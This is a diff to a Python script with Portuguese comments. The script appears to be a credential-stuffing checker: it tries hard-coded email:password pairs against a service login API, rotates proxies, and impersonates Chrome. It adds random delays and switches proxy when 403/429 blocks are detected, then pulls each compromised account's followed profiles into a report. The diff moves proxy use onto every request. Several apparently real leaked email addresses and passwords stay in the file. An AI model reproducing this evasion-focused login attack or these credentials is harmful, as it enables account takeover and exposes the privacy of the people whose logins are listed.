@@ -8,8 +8,6 @@ MODELOS_URL = "https://service.teste.com.br/profile/UserFollowing"
 
 # ==================== CREDENCIAIS ====================
 CREDENCIAIS_STRING = """
-felipexvr1@gmail.com:Luis!262820
-neninholima@yahoo.com.br:Messi@20121990
 fujinippon1@gmail.com:@Asf124578
 mikamisshate@gmail.com:Vip@2025
 juniorandrade90@outlook.com:Vip@2025
@@ -92,7 +90,7 @@ def main():
             print(f"\n🔐 Testando: {email}")
             
             sucesso_conta = False
-            max_tentativas = 3 # Tenta até 3 vezes com proxies diferentes
+            max_tentativas = 3
 
             for tentativa in range(1, max_tentativas + 1):
                 if sucesso_conta:
@@ -102,11 +100,8 @@ def main():
                 ip_display = meu_proxy['http'].split('@')[-1]
                 print(f"🌐 [Tentativa {tentativa}/{max_tentativas}] Usando Proxy: {ip_display}")
 
-                # Usando chrome120 igual ao bot e sem headers manuais
-                session = requests.Session(
-                    impersonate="chrome120",
-                    proxies=meu_proxy
-                )
+                # CRIANDO A SESSÃO SEM O PROXY AQUI (Idêntico ao bot)
+                session = requests.Session(impersonate="chrome120")
 
                 payload = {
                     "Email": email,
@@ -119,8 +114,8 @@ def main():
                 time.sleep(random.uniform(5.0, 10.0))
 
                 try:
-                    # Headers removidos daqui, o curl_cffi cria os originais automaticamente
-                    login_resp = session.post(LOGIN_API_URL, json=payload, timeout=20)
+                    # PASSANDO O PROXY DIRETO NO POST (Idêntico ao bot)
+                    login_resp = session.post(LOGIN_API_URL, json=payload, proxies=meu_proxy, timeout=20)
 
                     if login_resp.status_code in [403, 429]:
                         print(f"⚠️ Bloqueio {login_resp.status_code} detectado. Trocando de proxy...")
@@ -135,7 +130,9 @@ def main():
                             session.headers.update({"Authorization": f"Bearer {token}"})
 
                         time.sleep(random.uniform(2.0, 4.0))
-                        models_resp = session.get(MODELOS_URL, params={"page": 0, "limit": 100, "nickName": ""})
+                        
+                        # PASSANDO O PROXY NO GET TAMBÉM
+                        models_resp = session.get(MODELOS_URL, params={"page": 0, "limit": 100, "nickName": ""}, proxies=meu_proxy)
 
                         relatorio.write(f"\n{'-' * 70}\n")
                         relatorio.write(f"CONTA: {email}\n")
